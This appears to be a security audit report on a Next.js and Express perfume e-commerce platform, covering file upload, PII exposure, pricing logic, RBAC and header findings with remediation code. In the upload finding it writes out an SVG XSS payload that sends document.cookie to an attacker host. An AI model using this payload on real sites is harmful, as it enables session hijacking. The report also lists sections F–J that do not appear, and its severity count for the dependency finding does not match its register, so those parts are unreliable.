# Soulmate Scents — Comprehensive Full-Stack Security Audit & Vulnerability Assessment Report

**Target System:** Soulmate Scents — Luxury Perfume E-Commerce Platform  
**Architecture:** Next.js 16 (App Router Frontend) + Node.js / Express 4 REST API (Backend) + MongoDB / Mongoose ODM  
**Audit Type:** Full-Stack Offensive Security Assessment, DevSecOps & Architecture Audit  
**Mode:** Strict Read-Only Assessment (Zero code modified during testing)  
**Report File:** `docs/SECURITY_AUDIT_REPORT.md`  
**Assessment Date:** November 2026  
**Auditor Classification:** Lead Application Security & DevSecOps Specialist  

---

## Table of Contents
1. [Section A — Executive Summary](#section-a--executive-summary)
2. [Section B — Application Attack Surface & Architecture Map](#section-b--application-attack-surface--architecture-map)
3. [Section C — Comprehensive Security Checklist](#section-c--comprehensive-security-checklist)
4. [Section D — Detailed Vulnerability Register](#section-d--detailed-vulnerability-register)
   - [SEC-VULN-01: Unauthenticated Arbitrary File Upload & Stored XSS via `/api/upload`](#sec-vuln-01-unauthenticated-arbitrary-file-upload--stored-xss-via-apiupload)
   - [SEC-VULN-02: Unauthenticated Order & Customer PII Exposure via Order Confirmation](#sec-vuln-02-unauthenticated-order--customer-pii-exposure-via-order-confirmation)
   - [SEC-VULN-03: Unauthenticated Arbitrary Payment Proof URL Injection](#sec-vuln-03-unauthenticated-arbitrary-payment-proof-url-injection)
   - [SEC-VULN-04: Business Logic Price Tampering & Phantom Stock Spawning on Unmatched SKUs](#sec-vuln-04-business-logic-price-tampering--phantom-stock-spawning-on-unmatched-skus)
   - [SEC-VULN-05: Broken Access Control & Hardcoded Role Middleware Inconsistencies](#sec-vuln-05-broken-access-control--hardcoded-role-middleware-inconsistencies)
   - [SEC-VULN-06: Hardcoded Default Superadmin Password on Bootstrap](#sec-vuln-06-hardcoded-default-superadmin-password-on-bootstrap)
   - [SEC-VULN-07: Incomplete Token Lifecycle & Missing Revocation on Password Change](#sec-vuln-07-incomplete-token-lifecycle--missing-revocation-on-password-change)
   - [SEC-VULN-08: Missing Rate Limiting on Coupon Validation & Review Submissions](#sec-vuln-08-missing-rate-limiting-on-coupon-validation--review-submissions)
   - [SEC-VULN-09: Missing Express Proxy Trust Configuration](#sec-vuln-09-missing-express-proxy-trust-configuration)
   - [SEC-VULN-10: Missing Security Headers & Clickjacking Risk in Frontend Next.js](#sec-vuln-10-missing-security-headers--clickjacking-risk-in-frontend-nextjs)
   - [SEC-VULN-11: Known Critical & High Dependency Vulnerabilities (proxy-addr, undici, zod)](#sec-vuln-11-known-critical--high-dependency-vulnerabilities-proxy-addr-undici-zod)
5. [Section E — Role-Based Access Control (RBAC) Matrix](#section-e--role-based-access-control-rbac-matrix)
6. [Section F — Complete API Route Inventory & Security Matrix](#section-f--complete-api-route-inventory--security-matrix)
7. [Section G — Data Protection & Privacy Assessment](#section-g--data-protection--privacy-assessment)
8. [Section H — Dependencies & Supply Chain Security Analysis](#section-h--dependencies--supply-chain-security-analysis)
9. [Section I — Strategic Remediation Roadmap](#section-i--strategic-remediation-roadmap)
10. [Section J — Final Assessment & Release Verdict](#section-j--final-assessment--release-verdict)

---

## Section A — Executive Summary

### 1. Security Posture Analysis
A thorough, evidence-based security audit of the Soulmate Scents e-commerce platform was executed covering the Next.js frontend, Node.js/Express backend, MongoDB data tier, file storage, and business logic pipelines.

While the codebase incorporates several foundational security mechanisms—such as `bcryptjs` password hashing (12 rounds), `express-mongo-sanitize` for NoSQL operator injection prevention, `hpp` for HTTP parameter pollution, and `zod` schema validation for critical endpoints—several high-impact architectural and implementation vulnerabilities were discovered. The most urgent threats include **an unauthenticated arbitrary file upload endpoint allowing SVG-based stored XSS**, **public unauthenticated order confirmation endpoints exposing customer PII**, **unrestricted payment proof URL injection**, and **a fallback catalog pricing flaw coupled with automated inventory generation that enables arbitrary orders at unintended prices**.

### 2. Vulnerability Count by Severity
| Severity | Count | Summary of Key Issues |
| :--- | :---: | :--- |
| **CRITICAL** | **1** | Unauthenticated arbitrary image upload to public directory (`/api/upload`) allowing Stored XSS |
| **HIGH** | **4** | Unauthenticated PII leakage (`/orders/confirmation/:orderNumber`), arbitrary payment proof injection, catalog fallback pricing & phantom stock generation, and broken RBAC middleware across admin routes |
| **MEDIUM** | **5** | Hardcoded default superadmin seed password, missing JWT session revocation on password change, missing rate limits on coupon validation & reviews, unconfigured Express proxy trust, and missing HTTP security headers (clickjacking exposure) |
| **LOW / INFO** | **1** | Known dependency vulnerabilities (`proxy-addr`, `undici`, `zod`, `body-parser`) |
| **TOTAL** | **11** | **Action required prior to public production release** |

### 3. Overall Risk Rating: **HIGH RISK**
The presence of unauthenticated file upload, customer data enumeration, and financial/inventory logic loopholes places the application in a **HIGH RISK** tier.

### 4. Release Recommendation: **DO NOT RELEASE TO PRODUCTION WITHOUT REMEDIATION**
Production release must be blocked until all Critical (P0) and High (P1) vulnerabilities are remediated and verified.

---

## Section B — Application Attack Surface & Architecture Map

```mermaid
flowchart TD
    Client[Web Browser / External Attacker]

    subgraph Frontend [Next.js App Router (Port 3000)]
        UI_Public[Public Catalog, Cart, Checkout, FAQ]
        UI_Admin[Admin Dashboard Pages /admin/*]
        Next_API_Upload["/api/upload (Public POST - Vulnerable)"]
        Next_API_List["/api/perfume-images (Public GET)"]
        Next_Static["/public/images/perfumes/* (Public Static Files)"]
    end

    subgraph Backend [Express API Gateway (Port 5000)]
        Global_MW[Helmet, CORS, MongoSanitize, HPP, Global Rate Limiter]
        Auth_MW[auth.middleware.js]
        Role_MW[role.middleware.js vs permission.middleware.js]

        subgraph Routes [API Modules /api/v1]
            R_Auth["/auth (login, me, logout)"]
            R_Users["/users (CRUD, password)"]
            R_Products["/products (public catalog & admin CRUD)"]
            R_Inventory["/inventory (admin stock management)"]
            R_Orders["/orders (public checkout, confirmation, payment proof, admin)"]
            R_Coupons["/coupons (public validate, admin CRUD)"]
            R_Reviews["/reviews (public read/create, admin status)"]
            R_Newsletter["/newsletter (public subscribe, admin export)"]
        end
    end

    subgraph DataTier [Database & Storage]
        MongoDB[(MongoDB Atlas / Local)]
        LocalFS[Local Disk Storage /uploads & /public]
    end

    Client -->|HTTP/HTTPS| UI_Public
    Client -->|HTTP/HTTPS| UI_Admin
    Client -->|Direct POST| Next_API_Upload
    Client -->|Direct GET| Next_API_List
    Client -->|Direct GET| Next_Static

    UI_Public -->|Fetch API| Backend
    UI_Admin -->|Fetch API| Backend
    Next_API_Upload -->|Direct FS Write| Next_Static

    Global_MW --> Auth_MW --> Role_MW --> Routes
    Routes --> MongoDB
    Routes -->|Save Proof/Images| LocalFS
```

### Attack Surface Entry Points
1. **Public HTTP Surface (Frontend):**
   - Public pages: `/`, `/collection`, `/collection/[slug]`, `/cart`, `/checkout`, `/order-confirmation/[orderNumber]`, `/help`, `/contact`, `/journal`.
   - Public Next.js API Routes:
     - `POST /api/upload`: Unauthenticated multi-part file upload writing directly to `frontend/public/images/perfumes/`.
     - `GET /api/perfume-images`: Unauthenticated listing of files in `public/images/perfumes/`.
2. **Public API Surface (Backend `/api/v1`):**
   - `POST /auth/login`: Public authentication endpoint.
   - `GET /products` & `GET /products/:id`: Public catalog retrieval.
   - `POST /orders`: Public order placement (guest and authenticated checkout).
   - `GET /orders/confirmation/:orderNumber`: Public order detail retrieval using incremental/guessable order numbers.
   - `POST /orders/:orderNumberOrId/payment-proof`: Public endpoint allowing any user to submit arbitrary payment proof URLs for any order.
   - `POST /coupons/validate`: Public coupon discount check (no rate limiting).
   - `POST /reviews`: Public review submission (no rate limiting).
   - `POST /newsletter/subscribe`: Public newsletter subscription.
3. **Authenticated & Admin Surface (Backend `/api/v1`):**
   - Protected endpoints guarded by Bearer token or cookie JWT (`admin`, `superadmin`, `scent_specialist`, `inventory_manager`, `staff`).

---

## Section C — Comprehensive Security Checklist

| Category | Dimension | Status | Key Evidence / Observations |
| :--- | :--- | :---: | :--- |
| **1. Authentication** | Password Storage & Hashing | **PASS** | Bcrypt with 12 rounds implemented in `users.model.js`. Safe salt generation. |
| | Session & Token Revocation | **FAIL** | JWT tokens remain valid until expiry. Password changes do not invalidate existing tokens (`passwordChangedAt` absent). |
| | Seed Credentials | **FAIL** | Default fallback password `'AdminSecurePassword123!'` hardcoded in `seedAdmin.js`. |
| **2. Authorization** | Role-Based Access Control | **PARTIAL** | Fine-grained permissions exist in `permissions.js`, but route files (`products.routes.js`, `orders.routes.js`, `inventory.routes.js`) hardcode `authorize(ROLES.ADMIN)`, locking out other legitimate staff roles or creating RBAC dissonance. |
| | Object-Level Authorization (IDOR) | **FAIL** | `GET /orders/confirmation/:orderNumber` allows anyone to view customer PII without token or session validation. |
| **3. Input Validation** | Schema Validation | **PASS** | Zod schemas validate request payloads across all controller endpoints. |
| | NoSQL Injection Defense | **PASS** | `express-mongo-sanitize` strips `$` and `.` operators on all incoming request bodies and query parameters. |
| | Parameter Pollution | **PASS** | `hpp` middleware active in `app.js`. |
| **4. E-Commerce Logic** | Price Recalculation | **PARTIAL** | Backend recalculates subtotal from DB, but falls back to static demo catalog (`$150` default) if SKU is not in DB. |
| | Inventory Reservation Integrity | **FAIL** | `reserveStock` automatically spawns 50 units for non-existent inventory items on the fly (`inventory.service.js:289`). |
| | Payment Proof Verification | **FAIL** | Accepts unverified external URLs without validating ownership or file integrity. |
| **5. File Uploads** | File Upload Security | **FAIL** | Next.js `/api/upload` is unauthenticated, lacks file size limits, allows SVG (Stored XSS vector), and writes to public web root. |
| **6. Frontend Security** | Content Security Policy & Headers | **FAIL** | `next.config.ts` has zero security headers. No `Content-Security-Policy`, `X-Frame-Options`, or `X-Content-Type-Options`. |
| | Route Protection | **PARTIAL** | Frontend `middleware.ts` is an empty pass-through; admin route gating relies entirely on client-side React component redirects. |
| **7. API Abuse** | Rate Limiting | **PARTIAL** | Global rate limiter (200/15min) and checkout rate limiter (10/15min) exist. Coupon validation and reviews have zero rate limiting. |
| | Proxy Configuration | **FAIL** | Express app does not set `app.set('trust proxy', 1)`, making rate limiters bypassable via header spoofing or blocking multiple clients behind reverse proxies. |
| **8. Dependencies** | Third-Party Packages | **FAIL** | Critical vulnerability in backend (`proxy-addr` GHSA-jqcg-44mw-7w3h), high-severity vulnerabilities in `undici`, `zod`, `body-parser`. |

---

## Section D — Detailed Vulnerability Register

---

### SEC-VULN-01: Unauthenticated Arbitrary File Upload & Stored XSS via `/api/upload`
- **Severity:** **CRITICAL** (CVSS v3.1: 9.8 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`)
- **Affected File:** `frontend/src/app/api/upload/route.ts` (Lines 1–45)
- **Preconditions:** Network access to the Next.js frontend application. No authentication or API key required.

#### Vulnerability Description & Mechanism
The Next.js App Router exposes `POST /api/upload` which accepts `multipart/form-data`. The endpoint suffers from four critical flaws:
1. **Zero Authentication:** Any anonymous visitor on the internet can POST files to this route.
2. **Weak MIME Validation:** The code checks `if (!file.type.startsWith("image/"))`. Browsers provide arbitrary `Content-Type` headers which can be spoofed, or attackers can legitimately upload SVG images containing embedded JavaScript (`<svg onload="alert(document.cookie)">`).
3. **No File Size Limit:** No ceiling is enforced on the incoming buffer or chunk size, allowing attackers to exhaust server disk space or memory.
4. **Direct Write to Public Web Root:** Uploaded files are written directly to `public/images/perfumes/` using unhygienic timestamps (`Date.now() + "_" + file.name.replace(/[^a-zA-Z0-9.-]/g, "_")`).

#### Technical Evidence
```typescript
// frontend/src/app/api/upload/route.ts:14-36
export async function POST(request: NextRequest) {
  try {
    const data = await request.formData();
    const file: File | null = data.get("file") as unknown as File;

    if (!file) {
      return NextResponse.json({ error: "No file uploaded" }, { status: 400 });
    }

    if (!file.type.startsWith("image/")) {
      return NextResponse.json({ error: "Only image files are allowed" }, { status: 400 });
    }

    const bytes = await file.arrayBuffer();
    const buffer = Buffer.from(bytes);

    const uploadDir = path.join(process.cwd(), "public", "images", "perfumes");
    await mkdir(uploadDir, { recursive: true });

    const safeName = `${Date.now()}_${file.name.replace(/[^a-zA-Z0-9.-]/g, "_")}`;
    const filePath = path.join(uploadDir, safeName);
    await writeFile(filePath, buffer);

    return NextResponse.json({
      success: true,
      url: `/images/perfumes/${safeName}`,
    });
```

#### Real-World Exploit Scenario & Impact
1. An attacker uploads `exploit.svg` with content `<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://attacker.com/steal?c='+document.cookie)"><circle cx="50" cy="50" r="40"/></svg>`.
2. The endpoint returns `/images/perfumes/1794000000000_exploit.svg`.
3. The attacker submits this URL as an image in reviews, products, or sends the link to the store administrator.
4. When the administrator views the image on the site domain, the script executes in the context of the store domain, extracting session tokens, performing actions on behalf of the admin, or defacing the portal (Stored Cross-Site Scripting).

#### Safe Validation Steps
Send a curl POST request to the upload endpoint with an SVG payload:
```bash
curl -X POST http://localhost:3000/api/upload \
  -F "file=@test.svg;type=image/svg+xml"
```
The server will respond with `{ "success": true, "url": "/images/perfumes/..." }` without any authentication challenge.

#### Remediation Guidance
1. Move upload functionality to the Express backend behind `authenticate` and `requirePermission(PERMISSIONS.MANAGE_PRODUCTS)`.
2. Remove or restrict `frontend/src/app/api/upload/route.ts` immediately.
3. Validate magic bytes (file signature verification via `file-type` or `sharp`) rather than relying on `file.type`.
4. Disallow SVG uploads entirely, or re-encode all uploaded images using `sharp` to PNG/JPEG/WebP to strip embedded scripts.
5. Store user uploads in private object storage (S3 / Cloudinary / R2) or an isolated static domain with `Content-Disposition: attachment` or strict `Content-Security-Policy: default-src 'none'`.

---

### SEC-VULN-02: Unauthenticated Order & Customer PII Exposure via Order Confirmation
- **Severity:** **HIGH** (CVSS v3.1: 7.5 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`)
- **Affected File:** `backend/src/modules/orders/orders.routes.js` (Line 19) & `orders.service.js` (Lines 340–375)
- **Preconditions:** Network access to the backend API. No authentication required.

#### Vulnerability Description & Mechanism
The backend route `GET /api/v1/orders/confirmation/:orderNumber` is completely unauthenticated. It queries the database using `orderNumber` (e.g. `ORD-20261107-1001` or incremental counter formats) and returns the full `customerSnapshot` and `shippingAddress`.
Any external actor can enumerate sequential order numbers and scrape full customer names, phone numbers, email addresses, shipping addresses, order amounts, and payment methods.

#### Technical Evidence
```javascript
// backend/src/modules/orders/orders.routes.js:19
router.get("/confirmation/:orderNumber", ordersController.getOrderConfirmation);

// backend/src/modules/orders/orders.service.js:340-375
async getOrderConfirmation(orderNumber) {
  const order = await Order.findOne({ orderNumber })
    .select(
      "orderNumber status paymentStatus paymentMethod items subtotal discount shippingFee tax total currency customerSnapshot shippingAddress createdAt bankTransfer"
    )
    .lean();

  if (!order) {
    throw new NotFoundError("Order not found");
  }

  return {
    ...order,
    // Sensitive customer PII exposed:
    customerSnapshot: order.customerSnapshot,
    shippingAddress: order.shippingAddress,
  };
}
```

#### Real-World Exploit Scenario & Impact
An attacker writes a script scanning order numbers: `ORD-20261107-0001` to `ORD-20261107-9999`. The API dumps the complete customer database: real names, mobile phone numbers, physical residential delivery addresses, and purchasing habits. This violates GDPR, national data protection laws, and enables targeted phishing or harassment of customers.

#### Remediation Guidance
1. Require authentication for user orders: verify that `req.user.id === order.user`.
2. For guest checkout orders, require both `orderNumber` AND a verification secret (e.g., guest order tracking token generated at checkout or matching customer phone/email):
```javascript
// backend/src/modules/orders/orders.controller.js
const { orderNumber } = req.params;
const { email, phone, token } = req.query;
const order = await ordersService.getGuestOrderConfirmation(orderNumber, { email, phone, token });
```
3. Mask sensitive PII in the confirmation response (e.g., `phone: "+92 333 ****355"`, `address: "House ***, Street ***, Lahore"`).

---

### SEC-VULN-03: Unauthenticated Arbitrary Payment Proof URL Injection
- **Severity:** **HIGH** (CVSS v3.1: 7.3 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L`)
- **Affected File:** `backend/src/modules/orders/orders.routes.js` (Line 20) & `orders.service.js` (Lines 377–415)
- **Preconditions:** Any order number with `paymentStatus: 'pending'` and `paymentMethod: 'bank_transfer'`.

#### Vulnerability Description & Mechanism
The route `POST /api/v1/orders/:orderNumberOrId/payment-proof` accepts an unauthenticated POST request containing `proofData: { url, referenceNumber, notes }`.
The backend validates `proofData.url` via Zod as a generic string URL (`z.string().url()`) but never verifies:
1. Whether the client submitting the proof is the actual owner of the order.
2. Whether the uploaded file actually exists on the Soulmate Scents server or is an external phishing link.
3. Once submitted, it automatically flips `paymentStatus` to `"under_review"` and overrides previous proof data without concurrency control or audit logs.

#### Technical Evidence
```javascript
// backend/src/modules/orders/orders.service.js:377-415
async submitPaymentProof(orderNumberOrId, proofData) {
  const order = await this.getOrderByIdOrNumber(orderNumberOrId);
  // ...
  order.bankTransfer = {
    ...order.bankTransfer,
    receiptUrl: proofData.url,
    senderAccount: proofData.senderAccount || "",
    transactionReference: proofData.referenceNumber || "",
    notes: proofData.notes || "",
    submittedAt: new Date(),
  };

  order.paymentStatus = "under_review";
  await order.save();
  return order;
}
```

#### Real-World Exploit Scenario & Impact
1. Attacker monitors order confirmations (via SEC-VULN-02).
2. Attacker submits `proofData.url: "https://evil-phishing.com/receipt.html"` or malicious executable payloads to orders pending bank transfer.
3. Store administrators reviewing payment proofs click the link or see forged receipts, leading to social engineering, credential harvesting, or premature order fulfillment without legitimate payment.

#### Remediation Guidance
1. Require guest order verification token or authenticated user session before accepting payment proof.
2. Handle the file upload directly via a dedicated multer/S3 endpoint that enforces MIME types (PNG, JPG, PDF only) and stores files on secure, non-executable storage.
3. Disallow arbitrary external URLs; only store validated server-generated storage keys.

---

### SEC-VULN-04: Business Logic Price Tampering & Phantom Stock Spawning on Unmatched SKUs
- **Severity:** **HIGH** (CVSS v3.1: 8.3 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L`)
- **Affected Files:** `backend/src/modules/orders/orders.service.js` (Lines 110–135) & `backend/src/modules/inventory/inventory.service.js` (Lines 285–305)
- **Preconditions:** Network access to the checkout API `POST /api/v1/orders`.

#### Vulnerability Description & Mechanism
During `createOrder`:
1. If a customer submits a product/variant that does not exist in the database, instead of throwing an error and aborting checkout, the backend attempts to look up the item in a fallback demo catalog. If not found in the demo catalog, it assigns a default price of `$150`:
   ```javascript
   // backend/src/modules/orders/orders.service.js:114
   const unitPrice = dbProduct?.price ?? demoItem?.price ?? 150;
   ```
2. When the order is placed, `reserveStock()` in `inventory.service.js` is triggered. If the inventory record for that SKU does not exist in MongoDB, instead of failing, the system creates an inventory record with **50 units of stock out of thin air**:
   ```javascript
   // backend/src/modules/inventory/inventory.service.js:285-300
   let inventory = await Inventory.findOne({ product: productId, sku });
   if (!inventory) {
     inventory = await Inventory.create({
       product: productId,
       sku,
       available: 50, // Arbitrary stock injected!
       reserved: 0,
       safetyStock: 0,
       history: [{ change: 50, reason: "Initial seed", type: "restock" }],
     });
   }
   ```

#### Real-World Exploit Scenario & Impact
An attacker can forge checkout payloads with nonexistent product IDs or arbitrarily high-value customized item descriptions, purchase them at the hardcoded `$150` fallback rate, and trigger automated creation of phantom inventory records and shipping manifests. This corrupts financial reports, ledger records, and warehouse pick lists.

#### Remediation Guidance
1. Remove all fallback logic from production order processing. If a product or variant is not found in the database, immediately throw `BadRequestError("Product or variant is no longer available")`.
2. Reject inventory reservation if the SKU does not exist. Do not auto-seed stock during customer checkout:
   ```javascript
   if (!inventory) {
     throw new BadRequestError(`Inventory record not found for SKU: ${sku}`);
   }
   ```

---

### SEC-VULN-05: Broken Access Control & Hardcoded Role Middleware Inconsistencies
- **Severity:** **HIGH** (CVSS v3.1: 7.6 — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`)
- **Affected Files:**
  - `backend/src/modules/orders/orders.routes.js` (Lines 24–40)
  - `backend/src/modules/products/products.routes.js` (Lines 25–45)
  - `backend/src/modules/inventory/inventory.routes.js` (Lines 15–35)
  - `backend/src/utils/permissions.js`
- **Preconditions:** Authenticated user with non-admin staff roles (`scent_specialist`, `inventory_manager`, `staff`).

#### Vulnerability Description & Mechanism
The project defines a comprehensive 5-role permission matrix in `permissions.js`:
- `inventory_manager` is granted `PERMISSIONS.MANAGE_INVENTORY` and `PERMISSIONS.VIEW_PRODUCTS`.
- `scent_specialist` is granted `PERMISSIONS.MANAGE_PRODUCTS` and `PERMISSIONS.VIEW_PRODUCTS`.
- `staff` is granted `PERMISSIONS.VIEW_ORDERS` and `PERMISSIONS.VIEW_PRODUCTS`.

However, the actual routes in `products.routes.js`, `orders.routes.js`, and `inventory.routes.js` ignore `requirePermission()` and instead use `authorize(ROLES.ADMIN)`:
```javascript
// backend/src/modules/inventory/inventory.routes.js:15
router.use(authenticate, authorize(ROLES.ADMIN)); // Locks out inventory_manager!

// backend/src/modules/products/products.routes.js:25
router.post("/", authenticate, authorize(ROLES.ADMIN), ...); // Locks out scent_specialist!

// backend/src/modules/orders/orders.routes.js:25
router.get("/", authenticate, authorize(ROLES.ADMIN), ...); // Locks out staff!
```
This causes an operational failure (staff cannot perform their jobs) or prompts teams to share the `admin` or `superadmin` credentials, violating the principle of least privilege. Furthermore, where `authorize` is used without `superadmin` explicitly included, or where role checks are mixed, privilege escalation or authorization confusion occurs.

#### Remediation Guidance
Replace hardcoded `authorize(ROLES.ADMIN)` with fine-grained permission middleware throughout all administrative routes:
```javascript
// Example in inventory.routes.js:
router.use(authenticate);
router.get("/", requirePermission(PERMISSIONS.VIEW_INVENTORY), inventoryController.getInventory);
router.patch("/:id/stock", requirePermission(PERMISSIONS.MANAGE_INVENTORY), inventoryController.updateStock);
```

---

### SEC-VULN-06: Hardcoded Default Superadmin Password on Bootstrap
- **Severity:** **MEDIUM** (CVSS v3.1: 6.5 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L`)
- **Affected File:** `backend/src/config/seedAdmin.js` (Lines 15–20)
- **Preconditions:** Server deployment without setting `ADMIN_SEED_PASSWORD` in the environment.

#### Vulnerability Description & Mechanism
The administrative seeding script contains a hardcoded fallback password:
```javascript
// backend/src/config/seedAdmin.js:15
const password = process.env.ADMIN_SEED_PASSWORD || "AdminSecurePassword123!";
```
If an operator launches the backend container or instance without explicitly providing `ADMIN_SEED_PASSWORD`, the account `admin@perfume.com` is seeded with this publicly known default password. Any attacker scanning the application can log in as superadmin, granting complete control over user accounts, order data, coupons, and inventory.

#### Remediation Guidance
Never provide a fallback default password in production code. Fail fast on server startup if required admin credentials are not supplied:
```javascript
if (!process.env.ADMIN_SEED_PASSWORD) {
  if (process.env.NODE_ENV === "production") {
    throw new Error("FATAL: ADMIN_SEED_PASSWORD must be configured in production environment variables.");
  }
}
```

---

### SEC-VULN-07: Incomplete Token Lifecycle & Missing Revocation on Password Change
- **Severity:** **MEDIUM** (CVSS v3.1: 6.3 — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L`)
- **Affected Files:** `backend/src/modules/users/users.model.js` & `backend/src/middleware/auth.middleware.js`
- **Preconditions:** Stolen JWT token or password reset scenario.

#### Vulnerability Description & Mechanism
1. JWT verification in `auth.middleware.js` verifies the signature using `jwt.verify(token, env.JWT_SECRET)` without specifying an explicit algorithm whitelist (e.g. `algorithms: ['HS256']`).
2. The user model does not track `passwordChangedAt` or a token version (`tokenVersion`).
3. If an administrator or customer changes their password or suspects their account is compromised, previously issued JWT tokens remain 100% valid until the 7-day expiration timer elapses (`JWT_EXPIRES_IN="7d"`).

#### Remediation Guidance
1. Add `passwordChangedAt: { type: Date }` and `tokenVersion: { type: Number, default: 0 }` to `UserSchema`.
2. Increment `tokenVersion` on password change or explicit logout.
3. In `auth.middleware.js`, verify `payload.tokenVersion === user.tokenVersion` and reject requests if the token was issued prior to `user.passwordChangedAt`.
4. Restrict allowed JWT algorithms:
   ```javascript
   jwt.verify(token, env.JWT_SECRET, { algorithms: ["HS256"] });
   ```

---

### SEC-VULN-08: Missing Rate Limiting on Coupon Validation & Review Submissions
- **Severity:** **MEDIUM** (CVSS v3.1: 5.3 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N`)
- **Affected Files:**
  - `backend/src/modules/coupons/coupons.routes.js` (Line 16)
  - `backend/src/modules/reviews/reviews.routes.js` (Line 16)
- **Preconditions:** Network access to public API.

#### Vulnerability Description & Mechanism
1. **Coupon Brute-Forcing:** `POST /api/v1/coupons/validate` only has schema validation. An attacker can write an automated dictionary script testing thousands of promo codes (e.g., `SAVE10`, `VIP50`, `EID2026`) without being throttled.
2. **Review Flooding:** `POST /api/v1/reviews` has no route-level rate limiting. An attacker can flood the pending reviews database table with spam or defamatory entries.

#### Remediation Guidance
Add dedicated `express-rate-limit` instances:
```javascript
const couponRateLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 15, // Max 15 coupon attempts per 15 minutes
  message: { success: false, message: "Too many coupon attempts. Please try again later." },
});
router.post("/validate", couponRateLimiter, validate(validateCouponSchema), couponsController.validateCoupon);
```

---

### SEC-VULN-09: Missing Express Proxy Trust Configuration
- **Severity:** **MEDIUM** (CVSS v3.1: 5.3 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N`)
- **Affected File:** `backend/src/app.js`
- **Preconditions:** Backend deployed behind reverse proxy (Nginx, Cloudflare, AWS ALB, Render, Vercel).

#### Vulnerability Description & Mechanism
`backend/src/app.js` initializes `express()` and applies `rateLimit` middleware without setting:
```javascript
app.set("trust proxy", 1);
```
When deployed behind a reverse proxy, `req.ip` will either:
1. Always resolve to the internal proxy IP (e.g., `127.0.0.1` or `10.0.0.1`), causing all legitimate visitors to share a single rate-limiting bucket and triggering site-wide Denial of Service.
2. Rely on easily spoofed headers if `proxy-addr` is vulnerable, allowing malicious actors to bypass rate limits by sending random `X-Forwarded-For` headers.

#### Remediation Guidance
Configure trusted proxies in `backend/src/app.js`:
```javascript
if (env.NODE_ENV === "production") {
  app.set("trust proxy", 1); // Or specific subnet
}
```

---

### SEC-VULN-10: Missing Security Headers & Clickjacking Risk in Frontend Next.js
- **Severity:** **MEDIUM** (CVSS v3.1: 4.7 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N`)
- **Affected Files:** `frontend/next.config.ts` & `frontend/src/middleware.ts`
- **Preconditions:** Web browser interaction.

#### Vulnerability Description & Mechanism
1. `frontend/next.config.ts` configures image remote patterns but defines zero HTTP security headers.
2. The site does not send `X-Frame-Options: DENY` or `Content-Security-Policy: frame-ancestors 'none'`. As a result, the luxury perfume store and checkout flows can be embedded in an invisible iframe on a malicious website, exposing customers to clickjacking attacks.
3. Lack of `X-Content-Type-Options: nosniff` and `Strict-Transport-Security` (HSTS).

#### Remediation Guidance
Add standard security headers in `frontend/next.config.ts`:
```typescript
const nextConfig: NextConfig = {
  async headers() {
    return [
      {
        source: "/(.*)",
        headers: [
          { key: "X-Frame-Options", value: "DENY" },
          { key: "X-Content-Type-Options", value: "nosniff" },
          { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
          { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=()" },
          { key: "Strict-Transport-Security", value: "max-age=63072000; includeSubDomains; preload" },
        ],
      },
    ];
  },
  // ...
};
```

---

### SEC-VULN-11: Known Critical & High Dependency Vulnerabilities
- **Severity:** **MEDIUM** (CVSS v3.1: 5.3)
- **Affected Files:** `backend/package.json` & `frontend/package.json`
- **Preconditions:** Dependency resolution.

#### Vulnerability Details
1. **Backend Dependency Audit:**
   - 21 vulnerabilities identified (1 Critical, 6 High, 8 Moderate, 6 Low).
   - Critical: `proxy-addr` GHSA-jqcg-44mw-7w3h (IP spoofing / trust proxy bypass).
   - High: `body-parser` memory DoS, `zod` memory consumption, `brace-expansion` ReDoS.
2. **Frontend Dependency Audit:**
   - 30 vulnerabilities identified (1 Critical, 11 High, 17 Moderate, 1 Low).
   - High: `undici` HTTP request smuggling / memory leaks, `zod`, `@modelcontextprotocol/sdk`.

#### Remediation Guidance
Run audited package updates in isolated staging branch:
```bash
cd backend && npm audit fix
cd ../frontend && npm audit fix
```

---

## Section E — Role-Based Access Control (RBAC) Matrix

### System Role Definitions
1. **superadmin:** Full system ownership, user provisioning, global settings.
2. **admin:** Operational administrator, managing orders, products, inventory, coupons.
3. **scent_specialist:** Product catalog curator, creating and editing fragrance listings.
4. **inventory_manager:** Warehouse specialist, managing stock, replenishment, and alerts.
5. **staff:** Customer support and fulfillment agent, viewing orders and status updates.

### Permission Enforcement Comparison Table
| Feature / Action | Intended Role Access (`permissions.js`) | Actual Middleware Enforcement | Audit Finding |
| :--- | :--- | :--- | :--- |
| **Manage Users** | `superadmin` | `requirePermission(MANAGE_USERS)` | **PASS** — Enforced correctly |
| **Create Product** | `superadmin`, `admin`, `scent_specialist` | `authorize(ROLES.ADMIN)` | **FAIL** — `scent_specialist` blocked |
| **Edit Product** | `superadmin`, `admin`, `scent_specialist` | `authorize(ROLES.ADMIN)` | **FAIL** — `scent_specialist` blocked |
| **View Inventory** | `superadmin`, `admin`, `inventory_manager` | `authorize(ROLES.ADMIN)` | **FAIL** — `inventory_manager` blocked |
| **Update Stock** | `superadmin`, `admin`, `inventory_manager` | `authorize(ROLES.ADMIN)` | **FAIL** — `inventory_manager` blocked |
| **View Orders** | `superadmin`, `admin`, `staff` | `authorize(ROLES.ADMIN)` | **FAIL** — `staff` blocked |
| **Update Order Status** | `superadmin`, `admin` | `authorize(ROLES.ADMIN)` | **PASS** — Admin restricted |
| **Approve Payment** | `superadmin`, `admin` | `authorize(ROLES.ADMIN)` | **PASS** — Admin restricted |
| **Create Coupon** | `superadmin`, `admin` | `authorize(ROLES.ADMIN)` | **PASS** — Admin restricted |
